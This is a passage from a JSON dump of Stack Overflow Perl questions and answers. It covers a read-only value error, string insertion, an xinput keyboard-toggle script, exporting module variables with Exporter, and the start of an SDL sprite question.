Program.\n\n\n\n\n#---------------------------------------------------------------------------#\n\nThe error message is :\n\nModification of a read-only value attempted at stats_parser.pl line 23 (#1)\n(F) You tried, directly or indirectly, to change the value of a\nconstant.  You didn't, of course, try \"2 = 1\", because the compiler\ncatches that.  But an easy way to do the same thing is:\n\n    sub mod { $_[0] = 1 }\n    mod(2);\n\nAnother way is to assign to a substr() that's off the end of the string.\n\nYet another way is to assign to a foreach loop VAR when VAR\nis aliased to a constant in the look LIST:\n\n        $x = 1;\n        foreach my $n ($x, 2) {\n            $n *= 2; # modifies the $x, but fails on attempt to modify the 2\n        }\n\nUncaught exception from user code:\nModification of a read-only value attempted at stats_parser.pl line 23.\nat stats_parser.pl line 23\nmain::config_parser('O3CPU.py', 'config.ini') called at stats_parser.pl line                    13  \n</code></pre>\n"}, {"tags": ["regex", "perl"], "answers": [{"comments": [{"owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "edited": false, "score": 0, "creation_date": 1485467455, "post_id": 41883296, "comment_id": 70949666, "body": "While you can do this in a regex, you found a solution that allowed you to print out debug information and is probably easier to maintain. Congrats! Not every solution should be done with a regex!  (Sometimes it&#39;s unavoidable, but not this time.)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485470784, "post_id": 41883296, "comment_id": 70951078, "body": "To support comment by Tanktalus (beat me to it), this is a nice solution. Crystal clear and nicely maintable. Most of the time there are alternatives to complex regex and they are usually better code."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485470887, "post_id": 41883296, "comment_id": 70951119, "body": "Regex here isn&#39;t all that hard (I still prefer what you did), and for your reference: <code>$num =~ s&#47;(\\d{6})\\d*-\\K&#47;$1&#47;</code>. The only trick is <code>\\K</code>, a particular form of the <i>postive lookbehind</i>.  These patterns only <i>assert</i> that something is there, without consuming it.  The <code>\\K</code> also &#39;frees&#39; everything matched before it so that the substitution won&#39;t touch it. So we don&#39;t have to retype it.  See <a href=\"http://perldoc.perl.org/5.8.9/perlretut.html#Looking-ahead-and-looking-behind\" rel=\"nofollow noreferrer\"><code>this in perlretut</code></a>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485471478, "post_id": 41883296, "comment_id": 70951381, "body": "In fact <code>\\K</code> is in <a href=\"http://perldoc.perl.org/perlre.html#Extended-Patterns\" rel=\"nofollow noreferrer\">Extended Patterns in perlre</a>, under &quot;<i>Lookaround assertions</i>&quot;"}], "tags": [], "owner": {"reputation": 823, "user_id": 6605797, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f0668cfbeb382e47c22cd5e5afb4c240?s=128&d=identicon&r=PG&f=1", "display_name": "A_B", "link": "https://stackoverflow.com/users/6605797/a-b"}, "is_accepted": false, "score": 3, "last_activity_date": 1485466076, "creation_date": 1485466076, "answer_id": 41883296, "question_id": 41883232, "link": "https://stackoverflow.com/questions/41883232/perl-adding-string-in-middle-of-another-string/41883296#41883296", "title": "Perl Adding String in Middle of another String", "body": "<p>Figured it out </p>\n\n<pre><code>#!/usr/bin/perl\n\nmy $num = '7704814200-4299';\n\n# Check to see if it is a range\nif ($num =~ /-/)\n{\n  # Pull area code and exchange\n  my $extract = substr($num, 0, 6);\n  print \"Extracted this: $extract\\n\";\n\n  $num =~ s/-/-$extract/;\n  print $num;\n\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 1, "last_activity_date": 1485470370, "creation_date": 1485470370, "answer_id": 41884260, "question_id": 41883232, "link": "https://stackoverflow.com/questions/41883232/perl-adding-string-in-middle-of-another-string/41884260#41884260", "title": "Perl Adding String in Middle of another String", "body": "<p>Since you don't really need the full power of regular expression pattern matching, you can use <a href=\"http://perldoc.perl.org/functions/index.html\" rel=\"nofollow noreferrer\"><code>index</code></a> and the fourth parameter of <a href=\"http://perldoc.perl.org/functions/substr.html\" rel=\"nofollow noreferrer\"><code>substr</code></a> to insert some characters immediately after the hyphen:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $num = '7705554200-4299';\nsubstr($num, index($num, '-') + 1, 0, substr($num, 0, 6));\nprint \"$num\\n\";\n</code></pre>\n\n<p>You can also use <code>substr</code> as an lvalue, but personally, I find that version to be more obtuse:</p>\n\n<pre><code>substr($num, index($num, '-') + 1, 0) = substr($num, 0, 6);\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>7705554200-7705554299\n</code></pre>\n"}], "owner": {"reputation": 823, "user_id": 6605797, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f0668cfbeb382e47c22cd5e5afb4c240?s=128&d=identicon&r=PG&f=1", "display_name": "A_B", "link": "https://stackoverflow.com/users/6605797/a-b"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1092, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1485470370, "creation_date": 1485465850, "question_id": 41883232, "link": "https://stackoverflow.com/questions/41883232/perl-adding-string-in-middle-of-another-string", "title": "Perl Adding String in Middle of another String", "body": "<p>In Perl, what's the best way to turn this string: </p>\n\n<p>7705554200-4299</p>\n\n<p>into</p>\n\n<p>7705554200-7705554299</p>\n\n<p>I know how to grab the first 6 digits but not sure how to insert them after the hyphen.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $num = '7705554200-4299';\n\n# Check to see number is a range\nif ($num =~ /-/)\n{\n  # Pull area code and exchange\n  my $extract = substr($num, 0, 6);\n  print \"Area code + exchange: $extract\\n\";\n}\n</code></pre>\n"}, {"tags": ["bash", "perl", "keyboard"], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 2197964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6c12fa1b3d62ee59f4d63b7084601feb?s=128&d=identicon&r=PG&f=1", "display_name": "Hugo R", "link": "https://stackoverflow.com/users/2197964/hugo-r"}, "edited": false, "score": 0, "creation_date": 1485664263, "post_id": 41890130, "comment_id": 71016452, "body": "Thanks this works like a charm, It&#39;s okay without error handling for my use, because it is a very predictable, particular situation when I would run this script with little uncertainty as to the hard coded string."}], "tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": true, "score": 0, "last_activity_date": 1485511238, "last_edit_date": 1485511238, "creation_date": 1485507526, "answer_id": 41890130, "question_id": 41882479, "link": "https://stackoverflow.com/questions/41882479/bash-or-perl-toggle-internal-keyboard-script/41890130#41890130", "title": "bash or perl: toggle internal keyboard script", "body": "<p>I don't know the output of xinput, but based on the assumption that it delivers lines like you provided, it would be something along these lines (no way to test it now):</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $search = 'AT Translated Set 2 keyboard';\nmy @xout = qx(xinput); # or use backticks instead of qx\n\nmy ($id,$slave) = map { # search for match and capture the numbers\n    /$search.*id=(\\d+)\\s+\\[(?:floating slave|slave  keyboard \\((\\d+)\\))\\]/\n    ? ($1,$2) : ()\n    } @xout;\n\nif ( defined($slave) ) { # should be undef in case of 'floating slave'\n    if (open(my $fh, '&gt;', '.reattachData')) {\n        $fh-&gt;print($id.$/.$slave);\n        $fh-&gt;close;\n    }\n    qx(xinput float $id);\n}\nelse {\n    my @line = do { local(@ARGV) = '.reattachData';(&lt;&gt;) }; # read file\n    chomp(@line);\n    qx(xinput reattach $line[0] $line[1]);  \n}\n</code></pre>\n\n<p>This of course assumes that your search term is always found. No error handling there...</p>\n"}], "owner": {"reputation": 25, "user_id": 2197964, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6c12fa1b3d62ee59f4d63b7084601feb?s=128&d=identicon&r=PG&f=1", "display_name": "Hugo R", "link": "https://stackoverflow.com/users/2197964/hugo-r"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "accepted_answer_id": 41890130, "answer_count": 1, "score": 0, "last_activity_date": 1485511238, "creation_date": 1485462832, "question_id": 41882479, "link": "https://stackoverflow.com/questions/41882479/bash-or-perl-toggle-internal-keyboard-script", "title": "bash or perl: toggle internal keyboard script", "body": "<p>Not very familiar with perl or bash scripting, trying to write a script to toggle internal keyboard (on laptop using external mechanical keyboard).</p>\n\n<p>Toggle internal keyboard is easy enough to do with the xinput command:</p>\n\n<pre><code>$ xinput\n    \u23a1 Virtual core pointer                      id=2    [master pointer  (3)]\n    \u239c   \u21b3 Virtual core XTEST pointer                id=4    [slave  pointer  (2)]\n    \u239c   \u21b3 Elan Touchpad                             id=11   [slave  pointer  (2)]\n    \u239c   \u21b3 SINO WEALTH USB KEYBOARD                  id=15   [slave  pointer  (2)]\n    \u23a3 Virtual core keyboard                     id=3    [master keyboard (2)]\n        \u21b3 Virtual core XTEST keyboard               id=5    [slave  keyboard (3)]\n        \u21b3 Power Button                              id=6    [slave  keyboard (3)]\n        \u21b3 Video Bus                                 id=7    [slave  keyboard (3)]\n        \u21b3 Video Bus                                 id=8    [slave  keyboard (3)]\n        \u21b3 Sleep Button                              id=9    [slave  keyboard (3)]\n        \u21b3 USB2.0 VGA UVC WebCam                     id=10   [slave  keyboard (3)]\n        \u21b3 Asus WMI hotkeys                          id=12   [slave  keyboard (3)]\n        \u21b3 AT Translated Set 2 keyboard              id=13   [slave  keyboard (3)]\n        \u21b3 SINO WEALTH USB KEYBOARD                  id=14   [slave  keyboard (3)]\n</code></pre>\n\n<p>Identify id and float number of AT Translated Set 2 keyboard (built in keyboard).</p>\n\n<pre><code>$ xinput float 13\n$ xinput\n\u23a1 Virtual core pointer                      id=2    [master pointer  (3)]\n\u239c   \u21b3 Virtual core XTEST pointer                id=4    [slave  pointer  (2)]\n\u239c   \u21b3 Elan Touchpad                             id=11   [slave  pointer  (2)]\n\u239c   \u21b3 SINO WEALTH USB KEYBOARD                  id=15   [slave  pointer  (2)]\n\u23a3 Virtual core keyboard                     id=3    [master keyboard (2)]\n    \u21b3 Virtual core XTEST keyboard               id=5    [slave  keyboard (3)]\n    \u21b3 Power Button                              id=6    [slave  keyboard (3)]\n    \u21b3 Video Bus                                 id=7    [slave  keyboard (3)]\n    \u21b3 Video Bus                                 id=8    [slave  keyboard (3)]\n    \u21b3 Sleep Button                              id=9    [slave  keyboard (3)]\n    \u21b3 USB2.0 VGA UVC WebCam                     id=10   [slave  keyboard (3)]\n    \u21b3 Asus WMI hotkeys                          id=12   [slave  keyboard (3)]\n    \u21b3 SINO WEALTH USB KEYBOARD                  id=14   [slave  keyboard (3)]\n\u223c AT Translated Set 2 keyboard              id=13   [floating slave]\n</code></pre>\n\n<p>To reattach keyboard use:</p>\n\n<pre><code>$ xinput reattach 13 3\n</code></pre>\n\n<p>No major issues here, just curious about writing a script to do this automatically, so far I have some mock up code which goes like this:</p>\n\n<pre><code>#bin/bash\n\nval string = xinput | grep \"AT keyboard\"\n\nif(parse(string).attached)\n    val floatPartNumber = parse(string).id\n    val reattachNumber = parse(string).slaveNumber\n\n    # float keyboard\n    xinput float floatPartNumber\n\n    # create hidden file for storage\n    file = makeFile(\".reattachData\")\n\n    #add needed data to file\n    writeTOFile(file)(floatPartNumber)\n    writeTOFile(file)(reattachNumber)\nfi\nelse\n    val file = openFile(\".reattachData\") \n    val floatPartNumber = file.lineOne\n    val reattachNumber = file.lineTwo\n\n    # reattach keyboard\n    xinput reattach floatPartNumber reattachNumber\nend\n</code></pre>\n\n<p>I want to translate this into a bash or perl script, something easy to run without jumping through any hoops from my shell. </p>\n\n<p>Either, what might be a good online resource, or resources, for me to reference while creating the proper syntax for this?\nOr how would a functional version of this script look like?</p>\n"}, {"tags": ["perl", "moose", "perl-exporter"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1485455452, "post_id": 41880411, "comment_id": 70943030, "body": "<a href=\"http://perldoc.perl.org/Exporter.html#What-Not-to-Export\" rel=\"nofollow noreferrer\">Don&#39;t export variables!</a>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 3, "creation_date": 1485455591, "post_id": 41880411, "comment_id": 70943131, "body": "&quot;Don&#39;t export variables&quot; seconded, but then more generally -- why don&#39;t you have <code>use XYX qw(...)</code> in your <code>THIS</code>?  You want symbols from other packages, so import them."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1485455603, "post_id": 41880411, "comment_id": 70943141, "body": "I did a one-char fix. In the package, you had <code>XYX</code>, changed it to <code>XYZ</code>. It looks like what you intended. If not, feel free to revert my change."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1485455667, "post_id": 41880411, "comment_id": 70943175, "body": "&quot;Don&#39;t export variables&quot; - 3rded. Write a getter function/method."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1485459971, "post_id": 41880411, "comment_id": 70945577, "body": "<code>$VAR</code> doesn&#39;t refer to <code>$XYZ::VAR</code> because 1) You never imported it. You&#39;re missing <code>use XYZ;</code> 2) It&#39;s being hidden by another variable. Remove <code>our $VAR;</code>."}, {"owner": {"reputation": 747, "user_id": 590222, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/fba5be60a41679337637cdfba23bb4b1?s=128&d=identicon&r=PG", "display_name": "justrajdeep", "link": "https://stackoverflow.com/users/590222/justrajdeep"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1486666763, "post_id": 41880411, "comment_id": 71455718, "body": "@zdim ... i have not tried out the answers, got sidetracked. Will chose the correct answer when i try them out."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1486668942, "post_id": 41880411, "comment_id": 71456905, "body": "OK, thanks. No rush, this was just a reminder since people often forget and never come back. It is good to (eventually) have an answer labeled, for listings and future visitors to the page :)"}, {"owner": {"reputation": 1461, "user_id": 11413106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb804df0cd07dea005f85e7b3e9a0d42?s=128&d=identicon&r=PG&f=1", "display_name": "lordadmira", "link": "https://stackoverflow.com/users/11413106/lordadmira"}, "edited": false, "score": 0, "creation_date": 1608359949, "post_id": 41880411, "comment_id": 115565046, "body": "You stated that you cannot touch the <code>package XYZ</code> because it&#39;s owned by somebody else.  In that case directly using the fully qualified global <code>$XYZ::VAR</code> is the best you can hope for.  Anything else will just over complicate the matter.  If you&#39;re into Rube Goldberg you could always subclass XYZ or monkey patch it!"}], "answers": [{"tags": [], "owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "is_accepted": false, "score": 2, "last_activity_date": 1485455759, "creation_date": 1485455759, "answer_id": 41880537, "question_id": 41880411, "link": "https://stackoverflow.com/questions/41880411/how-to-access-variables-in-imported-module-in-local-scope-in-perl/41880537#41880537", "title": "how to access variables in imported module in local scope in perl?", "body": "<p>You do not want <code>our $VAR;</code> in <code>THIS</code>'s namespace.  That creates a lexical reference to <code>$THIS::VAR</code>.  Not what you want.</p>\n\n<p>Instead, you need to <code>use</code> properly:</p>\n\n<pre><code>use XYZ qw($VAR);\n</code></pre>\n\n<p>However, <code>XYZ</code> doesn't have an <code>import</code> to run here, so you need to update that.  There are two ways to fix <code>XYZ</code> to do this - one is to import import, e.g., <code>use Exporter qw(import);</code>, the other is to derive off <code>Exporter</code>, e.g., <code>use parent qw(Exporter);</code>.  Both of these will get <code>XYZ-&gt;import(...)</code> to work properly.</p>\n\n<p>Once <code>XYZ</code> is <code>use</code>ing <code>Exporter</code> correctly, then the <code>use XYZ qw($VAR);</code> line will cause perl to implicitly load XYZ and call <code>XYZ-&gt;import(qw($VAR))</code>, which will import that variable into your namespace.</p>\n\n<p>Now, having answered your question, I will join others in suggesting that exporting variables is a very bad code smell, and probably is not the best / cleanest way to do what you want.</p>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485551412, "post_id": 41880594, "comment_id": 70988395, "body": "@user590222  I&#39;ve added quite a bit since the original post, you may want to read it over.  I don&#39;t know whether you saw the edits thus this note."}, {"owner": {"reputation": 1461, "user_id": 11413106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb804df0cd07dea005f85e7b3e9a0d42?s=128&d=identicon&r=PG&f=1", "display_name": "lordadmira", "link": "https://stackoverflow.com/users/11413106/lordadmira"}, "edited": false, "score": 0, "creation_date": 1608359532, "post_id": 41880594, "comment_id": 115564980, "body": "He said that he could not change package XYZ so he can&#39;t create a getter there."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 1461, "user_id": 11413106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb804df0cd07dea005f85e7b3e9a0d42?s=128&d=identicon&r=PG&f=1", "display_name": "lordadmira", "link": "https://stackoverflow.com/users/11413106/lordadmira"}, "edited": false, "score": 0, "creation_date": 1608360331, "post_id": 41880594, "comment_id": 115565100, "body": "@lordadmira That statement was added after the fact. Even so, this post <i>is</i> what I want to convey to others who come here -- and, I solve their direct need as well (did you not notice that?)"}, {"owner": {"reputation": 1461, "user_id": 11413106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb804df0cd07dea005f85e7b3e9a0d42?s=128&d=identicon&r=PG&f=1", "display_name": "lordadmira", "link": "https://stackoverflow.com/users/11413106/lordadmira"}, "edited": false, "score": 0, "creation_date": 1608360777, "post_id": 41880594, "comment_id": 115565164, "body": "I see what you&#39;re saying. Everything you wrote is good stuff.  I just wanted to point out that the answer does not comport with the question because the current text is what people who come here will see.  XYZ cannot be modified."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 1461, "user_id": 11413106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb804df0cd07dea005f85e7b3e9a0d42?s=128&d=identicon&r=PG&f=1", "display_name": "lordadmira", "link": "https://stackoverflow.com/users/11413106/lordadmira"}, "edited": false, "score": 0, "creation_date": 1608361940, "post_id": 41880594, "comment_id": 115565352, "body": "@lordadmira Well, alright; thanks for noting that.  The way I see it is: people who come here generally don&#39;t have an &quot;immutable&quot; <code>XYZ</code> on their hands; so the main answer applies for most.  But -- there&#39;s also a solution for <code>XYZ</code> as given, for exporting variables. So I&#39;d rather not turn it around (I did just edit)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 1461, "user_id": 11413106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb804df0cd07dea005f85e7b3e9a0d42?s=128&d=identicon&r=PG&f=1", "display_name": "lordadmira", "link": "https://stackoverflow.com/users/11413106/lordadmira"}, "edited": false, "score": 1, "creation_date": 1608362170, "post_id": 41880594, "comment_id": 115565382, "body": "@lordadmira  There are also a few loose ends in the question (I don&#39;t get <code>THIS</code> package?) -- so (I think) I was mostly trying to address a generic issue of how to send variables around."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 6, "last_activity_date": 1608356662, "last_edit_date": 1608356662, "creation_date": 1485455899, "answer_id": 41880594, "question_id": 41880411, "link": "https://stackoverflow.com/questions/41880411/how-to-access-variables-in-imported-module-in-local-scope-in-perl/41880594#41880594", "title": "how to access variables in imported module in local scope in perl?", "body": "<p>Exporting variables may easily lead to trouble.</p>\n<p>Why not</p>\n<pre><code>package XYZ;\n\nuse strict;\nuse warnings;\n\nuse Exporter qw(import);\nour @EXPORT_OK = qw(get_var);\n\nmy $VAR = '...';  # no need for &quot;our&quot; now\n\nsub get_var { return $VAR }\n...\n1;\n</code></pre>\n<p>and then</p>\n<pre><code>package THIS;\n\nuse warnings;\nuse strict;\n\nuse XYZ qw(get_var);\n\nmy $var = get_var();    \n...\n1;\n</code></pre>\n<p>See <a href=\"http://perldoc.perl.org/Exporter.html\" rel=\"nofollow noreferrer\">Exporter</a>.</p>\n<p>As for what you tried to do, there are two direct problems</p>\n<ul>\n<li><p><code>$VAR</code> from <code>XYZ</code> is never imported into <code>THIS</code>. If you need symbols from other packages you need to import them.<sup>\u2020</sup> Those packages have to make them available first, so you need to add it to <code>@EXPORT_OK</code> as well.\nLike above but with <code>$VAR</code> instead of <code>get_var()</code></p>\n<pre><code>package XYZ;\n...\nuse Exporter qw(import);\nour @EXPORT_OK = qw($VAR);\n\nour $VAR = '...';  # need be &quot;our&quot; for this\n</code></pre>\n<p>with</p>\n<pre><code>package THIS;\n...\nuse XYZ qw($VAR);\n\nprint &quot;$VAR\\n&quot;;\n</code></pre>\n<p>Now <code>$VAR</code> can be used directly, including <em>being written to</em> (unless declared constant); that can change its value under the feet of yet other code, which may never even know about any of it.</p>\n<p>Another way is to use <code>@EXPORT</code> and then those symbols are introduced into every program that says <code>use Package;</code>. I strongly recommend to only use <code>@EXPORT_OK</code>, when callers need to explicitly list what they want. That also nicely documents what is being used.</p>\n</li>\n<li><p>Even once you add that, there is still a variable with the same name in <code>THIS</code>, which hides (masks, shadows) the <code>$XYZ::VAR</code>. So remove <code>our $VAR</code> in <code>THIS</code>. This is an excellent example of one problem with globals. Once they're introduced we have to be careful about them <em>always</em> and <em>everywhere</em>.</p>\n</li>\n</ul>\n<p>But there are far greater problems with sharing variables across modules.</p>\n<p>It makes code components entangled and the code gets harder and harder to work with. It runs contrary to principles of well defined scopes and modular design, it enables action at a distance, etc. Perl provides many good tools for structuring code and we rarely need globals and shared variables. It is telling that the <code>Exporter</code> itself <a href=\"http://perldoc.perl.org/Exporter.html#What-Not-to-Export\" rel=\"nofollow noreferrer\">warns against that</a>.</p>\n<p>Note how now <code>my $VAR</code> in <code>XYZ</code> is not visible outside <code>XYZ</code>; there is no way for any code outside <code>XYZ</code> to know about it or to access it.<sup>\u2021</sup> When it is <code>our</code> then any code in the interpreter can write it simply as <code>$XYZ::VAR</code>, and without even importing it; that's what we <em>don't</em> want.</p>\n<p>Of course that there may be a need for or good use of exporting variables, what can occasionally be found in modules. That is an exception though, to be used sparingly and carefully.</p>\n<hr />\n<p><sup>\u2020</sup> Unless they're declared as package globals under a lexical alias via <a href=\"https://perldoc.perl.org/functions/our\" rel=\"nofollow noreferrer\">our</a> in their <a href=\"https://perldoc.perl.org/functions/package\" rel=\"nofollow noreferrer\">package</a>, in which case they can be used <em>anywhere</em> as <code>$TheirPackageName::varname</code>.</p>\n<p><sup>\u2021</sup> This complete <a href=\"https://perldoc.perl.org/perlsub#Private-Variables-via-my%28%29\" rel=\"nofollow noreferrer\">privacy is courtesy of <code>my</code></a>.</p>\n"}], "owner": {"reputation": 747, "user_id": 590222, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/fba5be60a41679337637cdfba23bb4b1?s=128&d=identicon&r=PG", "display_name": "justrajdeep", "link": "https://stackoverflow.com/users/590222/justrajdeep"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 944, "favorite_count": 0, "accepted_answer_id": 41880594, "answer_count": 2, "score": 3, "last_activity_date": 1608356662, "creation_date": 1485455257, "last_edit_date": 1485460114, "question_id": 41880411, "link": "https://stackoverflow.com/questions/41880411/how-to-access-variables-in-imported-module-in-local-scope-in-perl", "title": "how to access variables in imported module in local scope in perl?", "body": "<p>I am stuck while creating a perl Moose module.</p>\n\n<p>I have a global pm module.</p>\n\n<pre><code>package XYZ;\nrequire Exporter;\nour @ISA = qw(Exporter);  ## EDIT missed this line \nour @EXPORT_OK = qw($VAR);\nmy $VAR1 = 1;\nour $VAR = {'XYZ' =&gt; $VAR1};\n1;\n</code></pre>\n\n<p>I want to get <code>$VAR</code> in a <code>Moose</code> module I'm creating</p>\n\n<pre><code>package THIS;\nuse Moose;\nuse YAML::XS;\nsub get_all_blocks{\n  my ($self) = @_;\n  require $self-&gt;get_pkg(); # this returns the full path+name of the above package\n  # i cannot use use lib+use since the get_pkg starts complaining \n\n  our $VAR;\n  print YAML::XS::Dump($XYZ::VAR); # this works\n  print YAML::XS::Dump($VAR); # this does not work\n  # i cannot use the scope resolution since XYZ would keep changing.\n\n}\n1;\n</code></pre>\n\n<p>Can someone please help me with accessing variable?</p>\n\n<p>EDIT: Missed one line in the <code>package XYZ</code> code.\nI cannot touch the <code>package XYZ</code> since it is owned/used by someone else, I can just use it :(</p>\n"}, {"tags": ["perl", "sdl"], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 7293586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33e199b9b4da51be23e674ca6308b248?s=128&d=identicon&r=PG&f=1", "display_name": "RickNMorty", "link": "https://stackoverflow.com/users/7293586/ricknmorty"}, "edited": false, "score": 0, "creation_date": 1485512741, "post_id": 41887070, "comment_id": 70965454, "body": "If you&#39;ll put 0 in the <code>step_y=&gt;1</code> you&#39;ll get an error <code>Illegal division by zero</code> so that&#39;s why i set <code>$anim-&gt;step_y(0);</code> so i&#39;ll try 52x52 and thanks for replying though, appreciate it :)"}], "tags": [], "owner": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "is_accepted": false, "score": 0, "last_activity_date": 1485492189, "creation_date": 1485492189, "answer_id": 41887070, "question_id": 41879579, "link": "https://stackoverflow.com/questions/41879579/how-to-correctly-move-a-sprite-image-in-sdl-perl/41887070#41887070", "title": "How to correctly move a sprite image in SDL Perl", "body": "<p>Your sprite sheet is 313 pixels wide and have 6 images. Killing 